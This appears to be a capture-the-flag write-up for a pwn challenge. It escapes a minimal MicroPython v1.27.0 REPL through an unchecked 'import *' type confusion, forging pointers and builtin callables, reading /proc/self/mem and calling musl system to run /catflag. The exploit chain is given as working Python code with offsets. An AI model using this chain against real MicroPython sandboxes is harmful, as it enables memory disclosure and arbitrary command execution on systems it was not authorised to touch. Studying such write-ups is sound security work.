# micromicromicropython

**Category:** Pwn

## Description
> instance: `ncat --ssl micromicromicropython.opus4-7.b01le.rs 8443`

## Overview
The target is a MicroPython v1.27.0 minimal REPL, not a conventional ELF-with-menu pwnable. The core bug is an unsafe `from mod import *` path: `sys.modules` can hold arbitrary objects, `__import__` returns them without validating the type, and `mp_import_all()` blindly casts the result to a module object. The solve uses that type confusion to materialize arbitrary in-process pointers as Python objects, forges callable wrappers for `mp_vfs_posix_file_open` and musl `system`, then executes `/catflag`.

## Technical details
The environment constraints come directly from `dist/Dockerfile`:

```dockerfile
RUN sed -i 's/#define MICROPY_PY_OS (1)/\/\/ #define MICROPY_PY_OS (1)/' \
        ./variants/minimal/mpconfigvariant.h
RUN make -j4 VARIANT=minimal
RUN echo -ne "#!/bin/sh\nexec /usr/local/bin/micropython -i" > /app/run
RUN chmod 111 /catflag
```

So the service is just `micropython -i` on the Unix `minimal` variant, with the high-level `os` module explicitly removed and the flag helper made execute-only. The challenge is therefore about escaping the interpreter's remaining internal capabilities, not about calling a convenient Python API.

The root cause is in the `import *` implementation. In v1.27.0, the import path accepts any value already present in `sys.modules`, and `mp_import_all()` then assumes that value is a real module:

```c
// py/builtinimport.c
mp_map_elem_t *elem = mp_map_lookup(&MP_STATE_VM(mp_loaded_modules_dict).map, args[0], MP_MAP_LOOKUP);
if (elem) {
    return elem->value;
}
```

```c
// py/runtime.c
void mp_import_all(mp_obj_t module) {
    mp_map_t *map = &mp_obj_module_get_globals(module)->map;
    ...
}
```

```c
// py/obj.h
static inline mp_obj_dict_t *mp_obj_module_get_globals(mp_obj_t module) {
    return ((mp_obj_module_t *)MP_OBJ_TO_PTR(module))->globals;
}
```

There is no type check between "value loaded from `sys.modules`" and "cast to `mp_obj_module_t`". That gives an attacker-controlled type confusion primitive: store a non-module object in `sys.modules`, trigger `from t import *`, and the runtime will reinterpret the object's second field as a pointer to a globals dictionary.

The solve script exploits this with `staticmethod` and `range`, because their layouts line up well with the required fake structures:

```c
// py/obj.h
typedef struct _mp_obj_static_class_method_t {
    mp_obj_base_t base;
    mp_obj_t fun;
} mp_obj_static_class_method_t;

typedef struct _mp_obj_dict_t {
    mp_obj_base_t base;
    mp_map_t map;
} mp_obj_dict_t;
```

```c
// py/objrange.c
typedef struct _mp_obj_range_t {
    mp_obj_base_t base;
    mp_int_t start;
    mp_int_t stop;
    mp_int_t step;
} mp_obj_range_t;
```

```c
// py/obj.h
typedef struct _mp_map_t {
    size_t all_keys_are_qstrs : 1;
    size_t is_fixed : 1;
    size_t is_ordered : 1;
    size_t used : (8 * sizeof(size_t) - 3);
    size_t alloc;
    mp_map_elem_t *table;
} mp_map_t;
```

`solve.py` turns these layouts into a fake one-entry module namespace:

```python
tr = range(id(name), ptr, 1)
mr = range(15, 1, id(tr) + 8)
sys.modules['t'] = staticmethod(mr)
g = {}
exec('from t import *', g)
```

The field mapping is the important part:

- `sys.modules['t'] = staticmethod(mr)` makes `mp_import_all()` read `mr` as `module->globals`.
- `mr = range(15, 1, id(tr) + 8)` is then reinterpreted as `mp_map_t`.
- `15` is `0b1111`, so the low three flag bits become `all_keys_are_qstrs=1`, `is_fixed=1`, `is_ordered=1`, and the remaining bits encode `used=1`.
- `alloc=1`, so the fake map has one entry.
- `table=id(tr)+8`, which points at `tr.start`.
- `tr = range(id(name), ptr, 1)` is reinterpreted as one `mp_map_elem_t`, so `key=id(name)` and `value=ptr`.

That is enough to make `from t import *` store an arbitrary raw pointer `ptr` into the Python globals dict under an attacker-chosen name. This is the central primitive used throughout the exploit.

MicroPython also leaks object addresses directly through `id()`:

```c
// py/obj.c
mp_obj_t mp_obj_id(mp_obj_t o_in) {
    mp_int_t id = (mp_int_t)o_in;
    ...
}
```

`solve.py` uses that to recover the PIE base from the built-in `dict` type:

```python
base = id(dict) - 0x2de30
```

The hardcoded offsets in the solve are the recovered symbol offsets for the challenge build. From that base, the exploit materializes internal type objects and function entry points:

- `base + 0x2fb40` -> `mp_type_vfs_posix_fileio`
- `base + 0x2fb10` -> `mp_type_vfs_posix_textio`
- `base + 0x2e530` -> `mp_type_fun_builtin_3`
- `base + 0x2e570` -> `mp_type_fun_builtin_1`
- `base + 0x1f319` -> `mp_vfs_posix_file_open`

The callable forgery works because fixed-arity builtins are just `{type, function_pointer}`:

```c
// py/obj.h
typedef struct _mp_obj_fun_builtin_fixed_t {
    mp_obj_base_t base;
    union {
        mp_fun_1_t _1;
        mp_fun_3_t _3;
    } fun;
} mp_obj_fun_builtin_fixed_t;
```

```c
// py/objfun.c
static mp_obj_t fun_builtin_3_call(mp_obj_t self_in, size_t n_args, size_t n_kw, const mp_obj_t *args) {
    mp_obj_fun_builtin_fixed_t *self = MP_OBJ_TO_PTR(self_in);
    return self->fun._3(args[0], args[1], args[2]);
}
```

So when the solve imports the raw pointer `id(r)+8` where `r = range(base+0x2e530, base+0x1f319, 1)`, that memory is treated as:

- first word: `&mp_type_fun_builtin_3`
- second word: `&mp_vfs_posix_file_open`

The result is a valid callable object that dispatches to `mp_vfs_posix_file_open(type, file, mode)`. That function is exactly what the exploit needs, because the minimal REPL does not expose a high-level file-opening API, but the internal VFS code is still present:

```c
// extmod/vfs_posix_file.c
mp_obj_t mp_vfs_posix_file_open(const mp_obj_type_t *type, mp_obj_t file_in, mp_obj_t mode_in) {
    ...
    case 'b':
        type = &mp_type_vfs_posix_fileio;
        break;
    case 't':
        type = &mp_type_vfs_posix_textio;
        break;
```

With forged `FileIO`, `TextIOWrapper`, and `fopen3`, the attacker can open `/proc/self/maps` and `/proc/self/mem`. That expands the primitive from "materialize an existing pointer" to "inspect arbitrary process memory" and "discover library bases".

The final stage is calling musl `system`. `solve.py` parses `/proc/self/maps` to find the base of `/lib/ld-musl-x86_64.so.1`, then adds the known `system` offset `0x5c5b6`. To supply a valid `char *`, it creates a heap string and leaks its backing buffer pointer from the `mp_obj_str_t` layout:

```c
// py/objstr.h
typedef struct _mp_obj_str_t {
    mp_obj_base_t base;
    size_t hash;
    size_t len;
    const byte *data;
} mp_obj_str_t;
```

So the `data` pointer is at `id(cmd) + 24`. The solve intentionally builds the command with `''.join(['/cat', 'flag'])` instead of using a literal, then reads that pointer from `/proc/self/mem`. Because MicroPython stores a trailing NUL byte for string data, the leaked pointer is suitable as a native `char *`.

The last call reuses the same type-confusion primitive twice:

- forge a `builtin_1` object whose function pointer is musl `system`
- forge an "argument object" whose raw `mp_obj_t` bits are exactly the leaked `char *`

This works because `fun_builtin_1_call()` passes `args[0]` unchanged into the target function pointer. On x86_64 musl, `mp_obj_t` and `char *` are both one machine word, so the call site effectively becomes `system(dp)`, where `dp` points to `"/catflag\0"`. That is sufficient to solve the challenge because `/catflag` is executable even though it is not readable.

## Proof-of-Concept
- Step 1: Build an arbitrary pointer materialization primitive through `from t import *`.

```python
def import_ptr(name, ptr):
    tr = range(id(name), ptr, 1)
    mr = range(15, 1, id(tr) + 8)
    sys.modules['t'] = staticmethod(mr)
    g = {}
    exec('from t import *', g)
    return g[name]
```

This produces a Python variable whose underlying `mp_obj_t` value is the raw pointer `ptr`. The exploit uses it both for legitimate runtime objects (types, forged callables) and for raw native pointers.

- Step 2: Recover the PIE base from `dict` and import the internal VFS types.

```python
base = id(dict) - 0x2de30
FileIO = import_ptr('FileIO', base + 0x2fb40)
TextIOWrapper = import_ptr('TextIOWrapper', base + 0x2fb10)
```

This produces the runtime base address and two valid type objects. Those are needed because `mp_vfs_posix_file_open` expects a concrete file-object type.

- Step 3: Forge a 3-argument builtin that dispatches to `mp_vfs_posix_file_open`, then open `/proc/self/maps` and `/proc/self/mem`.

```python
r = range(base + 0x2e530, base + 0x1f319, 1)
fopen3 = import_ptr('fopen3', id(r) + 8)

maps = fopen3(TextIOWrapper, '/proc/self/maps', 'r').read()
mem = fopen3(FileIO, '/proc/self/mem', 'rb')
```

This produces two real file objects backed by the process VFS. `maps` leaks shared-library mappings, and `mem` gives direct read access to the interpreter's address space.

- Step 4: Create a heap string for the command and leak its native `char *`.

```python
cmd = ''.join(['/cat', 'flag'])
mem.seek(id(cmd) + 24)
dp = int.from_bytes(mem.read(8), 'little')
```

This produces `dp`, the address of the NUL-terminated `"/catflag"` buffer. That pointer is the exact artifact needed for a later `system(dp)` call.

- Step 5: Resolve musl `system`, forge a 1-argument builtin for it, and invoke `/catflag`.

```python
ld = [int(line.split('-')[0], 16) for line in maps.split('\n')
      if '/lib/ld-musl-x86_64.so.1' in line and '00000000' in line][0]
r = range(base + 0x2e570, ld + 0x5c5b6, 1)
sys1 = import_ptr('sys1', id(r) + 8)
arg = import_ptr('arg', dp)
sys1(arg)
```

This produces direct command execution inside the jailed MicroPython process. The observed output is the remote `bctf{...}` flag printed by `/catflag`, which is exactly what running `python3 solve.py` against the provided instance returns.

## P/S
The `dist/catflag.c` file prints a placeholder `ctf{...}` string, but the live service returns a different `bctf{...}` flag when `/catflag` is executed. The exploit therefore has to be validated against the remote instance, not against the placeholder source string.
